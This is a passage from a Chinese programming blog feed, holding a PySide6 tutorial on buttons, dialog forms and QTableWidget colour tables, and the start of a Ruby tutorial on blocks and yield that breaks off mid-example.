class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Greetings</span><span class="token decorator annotation punctuation">@Slot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">say_hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Button clicked, Hello!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong><br>@Slot() 是一个装饰器，用来将一个函数定义为槽函数。现在可以先不理解它，但是还是需要这么写来防止意外错误。</p><p>需要创建 <em>QApplication</em> 来运行你的代码，创建一个 <em>QPushButton</em> 实例，它是一个可点击的按钮。在创建时传入的字符串会显示在按钮上：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Create the Qt Application</span>app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token comment"># Create a button</span>button <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"Click me"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在显示按钮之前，我们需要将按钮与之前定义的 <code>say_hello()</code> 函数连接。有新老两种方法来建立连接，我们这里就演示新的方法。<em>QPushButton</em> 预定义了一个叫 <code>clicked</code> 的信号，每当按钮被按下就会触发该信号。我们要把这个信号和 <code>say_hello()</code> 函数连接：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Connect the button to the function</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>say_hello<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后，我们显示这个按钮，并进入主循环：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Show the button</span>button<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Run the main Qt loop</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>完整代码：</p><pre class="line-numbers language-\" data-language="\"><code class="language-\">#!/usr/bin/pythonimport sysfrom PySide6.QtWidgets import QApplication, QPushButtonfrom PySide6.QtCore import Slot@Slot()def say_hello(): print("Button clicked, Hello!")# Create the Qt Applicationapp = QApplication(sys.argv)# Create a button, connect it and show itbutton = QPushButton("Click me")button.clicked.connect(say_hello)button.show()# Run the main Qt loopapp.exec_()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="创建带输入框和按钮的对话框程序"><a href="#创建带输入框和按钮的对话框程序" class="headerlink" title="创建带输入框和按钮的对话框程序"></a>创建带输入框和按钮的对话框程序</h1><p>如何用 <em>QDialog</em> 创建一个简单的对话框程序。这个程序可以让用户在 <em>QLineEdit</em> 组件中填入自己的名字，然后当点击 <em>QPushButton</em> 组件时程序会跟你打招呼</p><p>从创建一个对话框窗口的代码开始</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> QApplication<span class="token punctuation">,</span> QDialog<span class="token punctuation">,</span> QLineEdit<span class="token punctuation">,</span> QPushButton<span class="token keyword">class</span> <span class="token class-name">Form</span><span class="token punctuation">(</span>QDialog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>Form<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>parent<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>setWindowTitle<span class="token punctuation">(</span><span class="token string">"My Form"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 创建Qt应用程序</span>    app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    <span class="token comment"># 创建并显示Form</span>    form <span class="token operator">=</span> Form<span class="token punctuation">(</span><span class="token punctuation">)</span>    form<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 运行Qt主循环</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们对引用模块、创建 <em>QApplication</em> 和执行 Qt 主循环都不陌生。这里唯一要新学的是<strong>类的定义</strong>。</p><ul><li><code>super(Form, self).__init__(parent)</code> 表示调用父类 QDialog 的构造函数来初始化对话框。<code>super()</code> 函数用于调用父类的方法，这里通过 <code>super(Form, self)</code> 来调用 QDialog 类的构造函数。<code>parent</code> 参数表示对话框的父级窗口，如果没有指定，默认为 None。</li><li><code>self.setWindowTitle("My Form")</code> 设置对话框的标题为 “My Form”，即对话框的窗口标题栏上显示的文字。</li></ul><p>可以在此基础上继续添加其他界面元素和逻辑，以构建出符合你需求的对话框。</p><p>我们可以任意创建 PySide6 中组件的子类。在上面的程序中，我们定义了一个 <em>QDialog</em> 的子类，并将它命名为 <em>Form</em>。我们还执行了 init() 方法，它可以调用父组件 QDialog 的初始化方法。另外，<em>setWindowTitle()</em> 方法可以设置对话窗口的标题。在 <em>main()</em> 函数里，我们创建了一个 <em>Form</em> 对象并让它显示出来</p><h2 id="创建组件"><a href="#创建组件" class="headerlink" title="创建组件"></a>创建组件</h2><p>接下来，我们需要创建两个组件：一个 <em>QLineEdit</em>，用来让用户填写他的名字；一个 <em>QPushButton</em>，用来输出 <em>QLineEdit</em> 中的内容。所以，在 Form 的 <em>init()</em> 方法中加入下面两行代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建组件</span>self<span class="token punctuation">.</span>edit <span class="token operator">=</span> QLineEdit<span class="token punctuation">(</span><span class="token string">"Write my name here.."</span><span class="token punctuation">)</span>self<span class="token punctuation">.</span>button <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"Show Greetings"</span><span class="token punctuation">)</span><span class="token comment">#显而易见，这两个组件会显示对应的文字。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建布局以排列组件"><a href="#创建布局以排列组件" class="headerlink" title="创建布局以排列组件"></a>创建布局以排列组件</h2><p>Qt 中的布局支持可以帮助你排列程序中的组件。在这个例程中，我们用 <em>QVBoxLayout</em> 来对这两个组件进行<strong>垂直布局</strong>。在 <em>init()</em> 方法中创建组件的代码后加入下面的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 创建布局并添加组件</span>layout <span class="token operator">=</span> QVBoxLayout<span class="token punctuation">(</span>self<span class="token punctuation">)</span>layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">)</span>layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们创建了布局，并使用 <em>addWidget()</em> 方法在布局里添加了组件。</p><h2 id="创建函数并连接按钮"><a href="#创建函数并连接按钮" class="headerlink" title="创建函数并连接按钮"></a>创建函数并连接按钮</h2><p>最后一步，在 Form 类中创建一个函数，并且将它和按钮连接。我们想要我们的函数成为 Form 类的一部分，所以把它加在 <em>init()</em> 函数之后：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 向用户打招呼</span><span class="token keyword">def</span> <span class="token function">greetings</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Hello </span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个函数用来在控制台中输出 <em>QLineEdit</em> 中填入的内容。我们使用 <em>QLineEdit.text()</em> 方法获取文本。</p><p>然后只需要将 <em>QPushButton</em> 和 <em>Form.greetings()</em> 方法 <em>连接</em> 即可。在 <em>init()</em> 方法中加入下面这行代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 连接greetings槽和按钮单击信号</span>self<span class="token punctuation">.</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>greetings<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>尝试运行，你可以在 <em>QLineEdit</em> 中输入你的名字，然后看命令行向你打招呼。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> <span class="token punctuation">(</span>QLineEdit<span class="token punctuation">,</span> QPushButton<span class="token punctuation">,</span> QApplication<span class="token punctuation">,</span>    QVBoxLayout<span class="token punctuation">,</span> QDialog<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Form</span><span class="token punctuation">(</span>QDialog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token builtin">super</span><span class="token punctuation">(</span>Form<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>parent<span class="token punctuation">)</span> <span class="token comment">#parent指定对话框的父窗口</span>        <span class="token comment"># 创建组件</span>        self<span class="token punctuation">.</span>edit <span class="token operator">=</span> QLineEdit<span class="token punctuation">(</span><span class="token string">"Write my name here"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>button <span class="token operator">=</span> QPushButton<span class="token punctuation">(</span><span class="token string">"Show Greetings"</span><span class="token punctuation">)</span>        <span class="token comment"># 创建布局并添加组件</span>        layout <span class="token operator">=</span> QVBoxLayout<span class="token punctuation">(</span><span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">)</span>        layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>button<span class="token punctuation">)</span>        <span class="token comment"># 应用布局</span>        self<span class="token punctuation">.</span>setLayout<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>        <span class="token comment"># 连接greetings槽和按钮单击信号</span>        self<span class="token punctuation">.</span>button<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>self<span class="token punctuation">.</span>greetings<span class="token punctuation">)</span>    <span class="token comment"># 向用户打招呼</span>    <span class="token keyword">def</span> <span class="token function">greetings</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Hello </span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>edit<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># 创建Qt应用程序</span>    app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    <span class="token comment"># 创建并显示Form</span>    form <span class="token operator">=</span> Form<span class="token punctuation">(</span><span class="token punctuation">)</span>    form<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 运行Qt主循环</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="使用QTableWidget组件显示数据"><a href="#使用QTableWidget组件显示数据" class="headerlink" title="使用QTableWidget组件显示数据"></a>使用QTableWidget组件显示数据</h1><p>想要在表格里显示数据，可以直接使用 <em><strong>QTableWidget</strong></em> 组件来完成。本节教程将完成一个显示颜色列表的程序。</p><p>注意，使用 <em>QTableWidget</em> 不是在表格中显示信息的唯一方法。你也可以创建数据列表并用 <em>QTableView</em> 将其显示出来。</p><h2 id="引用-QTableWidget，QTableWidgetItem-和-QColor-来显示背景颜色"><a href="#引用-QTableWidget，QTableWidgetItem-和-QColor-来显示背景颜色" class="headerlink" title="引用 QTableWidget，QTableWidgetItem 和 QColor 来显示背景颜色"></a>引用 <em>QTableWidget</em>，<em>QTableWidgetItem</em> 和 <em>QColor</em> 来显示背景颜色</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtGui <span class="token keyword">import</span> QColor<span class="token keyword">from</span> PySide6<span class="token punctuation">.</span>QtWidgets <span class="token keyword">import</span> <span class="token punctuation">(</span>QApplication<span class="token punctuation">,</span> QTableWidget<span class="token punctuation">,</span>                               QTableWidgetItem<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建列表来存储各种颜色对应的十六进制码"><a href="#创建列表来存储各种颜色对应的十六进制码" class="headerlink" title="创建列表来存储各种颜色对应的十六进制码"></a>创建列表来存储各种颜色对应的十六进制码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">colors <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"Red"</span><span class="token punctuation">,</span> <span class="token string">"#FF0000"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Green"</span><span class="token punctuation">,</span> <span class="token string">"#00FF00"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Blue"</span><span class="token punctuation">,</span> <span class="token string">"#0000FF"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Black"</span><span class="token punctuation">,</span> <span class="token string">"#000000"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"White"</span><span class="token punctuation">,</span> <span class="token string">"#FFFFFF"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Electric Green"</span><span class="token punctuation">,</span> <span class="token string">"#41CD52"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Dark Blue"</span><span class="token punctuation">,</span> <span class="token string">"#222840"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token punctuation">(</span><span class="token string">"Yellow"</span><span class="token punctuation">,</span> <span class="token string">"#F9E56d"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="定义用来将十六进制码转换为RGB值的函数"><a href="#定义用来将十六进制码转换为RGB值的函数" class="headerlink" title="定义用来将十六进制码转换为RGB值的函数"></a>定义用来将十六进制码转换为RGB值的函数</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_rgb_from_hex</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>    code_hex <span class="token operator">=</span> code<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    rgb <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>code_hex<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> QColor<span class="token punctuation">.</span>fromRgb<span class="token punctuation">(</span>rgb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rgb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> rgb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初始化-QApplication-对象"><a href="#初始化-QApplication-对象" class="headerlink" title="初始化 QApplication 对象"></a>初始化 <em>QApplication</em> 对象</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">app <span class="token operator">=</span> QApplication<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="循环列表，创建-QTableWidgetItems-对象，并按照-x-y-坐标将其加入表格"><a href="#循环列表，创建-QTableWidgetItems-对象，并按照-x-y-坐标将其加入表格" class="headerlink" title="循环列表，创建 QTableWidgetItems 对象，并按照 x, y 坐标将其加入表格"></a>循环列表，创建 <em>QTableWidgetItems</em> 对象，并按照 x, y 坐标将其加入表格</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i<span class="token punctuation">,</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> code<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>colors<span class="token punctuation">)</span><span class="token punctuation">:</span>    item_name <span class="token operator">=</span> QTableWidgetItem<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    item_code <span class="token operator">=</span> QTableWidgetItem<span class="token punctuation">(</span>code<span class="token punctuation">)</span>    item_color <span class="token operator">=</span> QTableWidgetItem<span class="token punctuation">(</span><span class="token punctuation">)</span>    item_color<span class="token punctuation">.</span>setBackground<span class="token punctuation">(</span>get_rgb_from_hex<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span>    table<span class="token punctuation">.</span>setItem<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> item_name<span class="token punctuation">)</span>    table<span class="token punctuation">.</span>setItem<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> item_code<span class="token punctuation">)</span>    table<span class="token punctuation">.</span>setItem<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> item_color<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="显示表格并运行-QApplication-循环"><a href="#显示表格并运行-QApplication-循环" class="headerlink" title="显示表格并运行 QApplication 循环"></a>显示表格并运行 <em>QApplication</em> 循环</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">table<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span>app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="最终运行效果"><a href="#最终运行效果" class="headerlink" title="最终运行效果"></a>最终运行效果</h2><p><img src="/2023/10/19/pyside6-shang-shou/image-20231019115252231.png" alt="image-20231019115252231"></p><p><a href="https://blog.csdn.net/baidu_36499789/article/details/113835688">参考链接</a></p>]]></content>
      
      
      <categories>
          
          <category> PySide6 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PySide6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ruby入门学习(1)</title>
      <link href="/2023/10/17/ruby-ru-men-xue-xi-1/"/>
      <url>/2023/10/17/ruby-ru-men-xue-xi-1/</url>
      
        <content type="html"><![CDATA[<h1 id="块"><a href="#块" class="headerlink" title="块"></a>块</h1><h3 id="yield用法"><a href="#yield用法" class="headerlink" title="yield用法"></a>yield用法</h3><p>其他编程语言中被称为闭包。 它由一组代码组成，它们始终用大括号括起来，或者在do..end之间书写。 大括号语法总是具有比do..end语法更高的优先级。也就是说大括号优先级高，do..end优先级低</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/ruby</span><span class="token comment"># -*- coding: UTF-8 -*-</span> <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test</span></span>   puts <span class="token string-literal"><span class="token string">"在 test 方法内"</span></span>   <span class="token keyword">yield</span>   puts <span class="token string-literal"><span class="token string">"你又回到了 test 方法内"</span></span>   <span class="token keyword">yield</span><span class="token keyword">end</span>test <span class="token punctuation">{</span>puts <span class="token string-literal"><span class="token string">"你在块内"</span></span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的块得放在函数后面，然名变量名字必须一样</p><p>还可以传递带有参数的 yield 语句</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/ruby</span><span class="token comment"># -*- coding: UTF-8 -*-</span> <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">test</span></span>   <span class="token keyword">yield</span> <span class="token number">5</span>   puts <span class="token string-literal"><span class="token string">"在 test 方法内"</span></span>   <span class="token keyword">yield</span> <span class="token number">100</span><span class="token keyword">end</span>test <span class="token punctuation">{</span><span class="token operator">|</span>i<span class="token operator">|</span> puts <span class="token string-literal"><span class="token string">"你在块 </span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">i</span><span class="token delimiter punctuation">}</span></span><span class="token string"> 内"</span></span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想要传递多个参数，那么 <em>yield</em> 语句如下所示：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">yield</span> a<span class="token punctuation">,</span> b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，块如下所示：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">test <span class="token punctuation">{</span><span class="token operator">|</span>a<span class="token punctuation">,</span> b<span class="token operator">|</span> statement<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="BEGIN-和-END-块"><a href="#BEGIN-和-END-块" class="headerlink" title="BEGIN 和 END 块"></a>BEGIN 和 END 块</h3><p>每个 Ruby 源文件可以声明当文件被加载时要运行的代码块（BEGIN 块），以及程序完成执行后要运行的代码块（END 块）</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/ruby</span> <span class="token keyword">BEGIN</span> <span class="token punctuation">{</span>   <span class="token comment"># BEGIN 代码块</span>  puts <span class="token string-literal"><span class="token string">"BEGIN 代码块"</span></span><span class="token punctuation">}</span>  <span class="token keyword">END</span> <span class="token punctuation">{</span>   <span class="token comment"># END 代码块</span>  puts <span class="token string-literal"><span class="token string">"END 代码块"</span></span><span class="token punctuation">}</span>  <span class="token comment"># MAIN 代码块</span>puts <span class="token string-literal"><span class="token string">"MAIN 代码块"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果</p><pre class="line-numbers language-none"><code class="language-none">BEGIN 代码块MAIN 代码块END 代码块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="块变量"><a href="#块变量" class="headerlink" title="块变量"></a>块变量</h3><p>可以在块参数外部和内部使用相同的变量，看看下面的例子。</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/ruby   </span>x <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Outer variable"</span></span>    <span class="token number">3.</span>times <span class="token keyword">do</span> <span class="token operator">|</span>x<span class="token operator">|</span>    puts <span class="token string-literal"><span class="token string">"Inside the block: </span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">x</span><span class="token delimiter punctuation">}</span></span><span class="token string">"</span></span>    <span class="token keyword">end</span>    puts <span class="token string-literal"><span class="token string">"Outside the block: </span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">x</span><span class="token delimiter punctuation">}</span></span><span class="token string">"</span></span><span class="token comment">#输出结果</span><span class="token comment">=beginInside the block: 0Inside the block: 1Inside the block: 2Outside the block: Outer variable=end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="符号参数-amp-块"><a href="#符号参数-amp-块" class="headerlink" title="符号参数(&amp;块)"></a>符号参数(&amp;块)</h3><p><code>&amp;</code>块是一种将参考(而不是局部变量)传递给块的方法。这里，块之后的<code>&amp;</code>只是一个引用的名字，任何其他的名字都可以用它来代替。</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!/usr/bin/ruby   </span><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">met</span></span><span class="token punctuation">(</span><span class="token operator">&amp;</span>block<span class="token punctuation">)</span>     puts <span class="token string-literal"><span class="token string">"This is method"</span></span>     block<span class="token punctuation">.</span>call   <span class="token keyword">end</span>   met <span class="token punctuation">{</span> puts <span class="token string-literal"><span class="token string">"This is &amp;block example"</span></span> <span class="token punctuation">}</span><span class="token comment">=beginThis is methodThis is &amp;block example=end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里，<code>met</code>方法中的块变量是对块的引用，它使用<code>call</code>来执行。 调用方法与<code>yield</code>方法相同</p><h3 id="使用默认值初始化对象"><a href="#使用默认值初始化对象" class="headerlink" title="使用默认值初始化对象"></a>使用默认值初始化对象</h3><p>Ruby有一个初始化器，称为<code>yield(self)</code>。 在这里，<code>self</code>是被初始化的对象。yield(self)是类的初始化器（构造函数）中使用的一种常见技术。</p><p>当你在一个类的初始化器中调用<code>yield(self)</code>时，它会执行与当前对象相关联的块代码。这允许你在对象实例化的过程中执行一些自定义的逻辑或初始化操作，同时让块代码能够访问当前对象的实例变量和方法。</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Person</span>  attr_accessor <span class="token symbol">:name</span><span class="token punctuation">,</span> <span class="token symbol">:age</span>    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> age<span class="token punctuation">)</span>    <span class="token variable">@name</span> <span class="token operator">=</span> name    <span class="token variable">@age</span> <span class="token operator">=</span> age    <span class="token keyword">yield</span><span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token keyword">if</span> block_given<span class="token operator">?</span>  <span class="token comment"># 调用块代码，并传递当前对象</span>  <span class="token keyword">end</span><span class="token keyword">end</span>person <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"John"</span></span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>p<span class="token operator">|</span>  puts <span class="token string-literal"><span class="token string">"Custom initialization for </span><span class="token interpolation"><span class="token delimiter punctuation">#{</span><span class="token content">p<span class="token punctuation">.</span>name</span><span class="token delimiter punctuation">}</span></span><span 